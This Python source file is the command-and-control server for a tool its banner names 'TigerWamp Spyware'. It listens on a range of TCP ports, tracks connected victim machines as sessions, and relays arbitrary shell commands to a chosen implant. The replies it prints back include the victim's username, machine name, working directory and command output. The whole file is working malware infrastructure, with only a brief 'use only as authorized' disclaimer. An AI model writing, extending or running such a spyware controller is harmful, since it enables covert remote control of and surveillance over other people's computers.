import random
import socket
import os
import struct
from _thread import *
from multiprocessing import *
import sys
import platform
import binascii
import time
import datetime

__server_host = "localhost"
__server_ports = [x for x in range(3000, 3100)]  # change me
__server_port = None

ThreadCount = 0
ServerSideSocket = None
manager = None
active_sessions = None
active_session = None
ip_address = None
username = None
cwd = None
ps = None


def print_banner():
    print("+========================================================+")
    print("+    Command and Control server for TigerWamp Spyware    +")
    print("+        By Wesley Jones (Github: wesleyjones001)        +")
    print("+                                                        +")
    print("+ This software has no warranty to the extent permitted  +")
    print("+  by law. Use at your own risk and only as authorized.  +")
    print("+========================================================+")


def init_server():
    global __server_port
    global ServerSideSocket
    ServerSideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    status = False
    for port in __server_ports:
        print(f"Trying to initialize C&C server on  port {port}...")
        try:
            ServerSideSocket.bind((__server_host, port))
            status = True
            __server_port = port
            break
        except Exception as e:
            print(str(e))

    ServerSideSocket.listen(5)
    return status


def handle_connections(ServerSideSocket: socket, active_sessions):
    i = 0
    while True:
        Client, address = ServerSideSocket.accept()
        active_sessions.append(
            (i, ''.join(format(x, '02x') for x in random.randbytes(6)), address, time.time(), Client))
        # start_new_thread(multi_threaded_client, (Client,))
        i += 1


def linux_distribution():
    try:
        return platform.linux_distribution()
    except:
        return "N/A"


def dist():
    try:
        return platform.dist()
    except:
        return "N/A"


def print_status():
    print(f'Running on port: {__server_port}')
    print("""Python version: %s
    dist: %s
    linux_distribution: %s
    system: %s
    machine: %s
    platform: %s
    uname: %s
    version: %s
    """ % (
        sys.version.split('\n'),
        str(dist()),
        linux_distribution(),
        platform.system(),
        platform.machine(),
        platform.platform(),
        platform.uname(),
        platform.version(),
    ))


def print_sessions():
    global active_session
    print("=========SESSIONS=========")
    for i, session_id, address, timestamp, _ in active_sessions:
        value = datetime.datetime.fromtimestamp(timestamp)
        dt = value.strftime('%Y-%m-%d %H:%M:%S')
        status = ''
        if active_session and ((active_session[1] == session_id) or (active_session[0] == i)):
            status = "ACTIVE "
        print(f'{status}Session {i}: {address[0]}:{address[1]} {dt} {str(session_id)}')
    if len(active_sessions) == 0:
        print('No active sessions.')


def get_respone_prefix(response: str):
    a1 = response.find("::")
    header_len = int(response[0:a1])
    header = response[a1 + 2:header_len + 2]
    a2 = header.split("::")
    username, machine_name, cwd, ps, out = a2[0], a2[1], a2[2], a2[3], a2[4]
    return username, machine_name, cwd, ps, out


def run_server_command(command):
    global ServerSideSocket
    global active_session
    global active_sessions
    global ip_address
    global username
    global cwd
    global ps
    try:
        if active_session is not None:
            if command == "background":
                active_session = None
                ip_address = None
            elif command == "clients" or command == "sessions":
                print_sessions()
            else:
                if len(command) > 0:
                    active_session[4].send((command + "\n").encode())
                    response1 = active_session[4].recv(135).decode()
                    username, machine_name, cwd, ps, out = get_respone_prefix(response1)
                    response2 = active_session[4].recv(int(out)).decode()
                    print(response2)

        else:
            if command == 'status':
                print_status()
            elif command == "clients" or command == "sessions":
                print_sessions()
            elif command == "banner":
                print_banner()
            elif command.startswith('sessions') and len(command) > 9:
                session_id = command[9:]
                if len(session_id) == 12:
                    for session in active_sessions:
                        if session[1] == session_id:
                            active_session = session
                            ip_address = session[2][0]
                            break
                elif session_id == '-1':
                    active_session = None
                else:
                    for session in active_sessions:
                        if str(session[0]) == session_id:
                            active_session = session
                            ip_address = session[2][0]
                            break
            elif command == "clear" or command == "cls":
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
            elif command == 'exit' or command == "quit" or command == "bye":
                handler.terminate()
                handler.join()
                for session in active_sessions:
                    try:
                        session[4].shutdown(0)
                    except Exception as e:
                        session[4].close()
                ServerSideSocket.shutdown(0)
                sys.exit()
            elif len(command) > 0:
                stream = os.popen(command)
                output = stream.read()
                if output.strip() != '':
                    print(output)
    except Exception as e:
        print(str(e))


handler = None
if __name__ == '__main__':
    print_banner()
    print()
    try:
        status = init_server()
        if status:
            print("Server initialized")
        else:
            print("Unable to init server. Error!")
            exit()
    except Exception as e:
        print(str(e))
        print("Exiting...")
        quit(-1)
    manager = Manager()
    active_sessions = manager.list()
    print()
    print("Type help or ? for a list of commands")
    print()

    handler = Process(target=handle_connections, args=(ServerSideSocket, active_sessions))
    handler.start()
    while True:
        command = ''
        if ip_address != None:
            PS = ''
            if ps == "1":
                PS = "PS "
            command = input(f"{PS}{username}@{ip_address} - ({cwd}) >$ ")
        else:
            command = input(f"SERVER@{__server_host} $ ")
        run_server_command(command)

    ServerSideSocket.close()
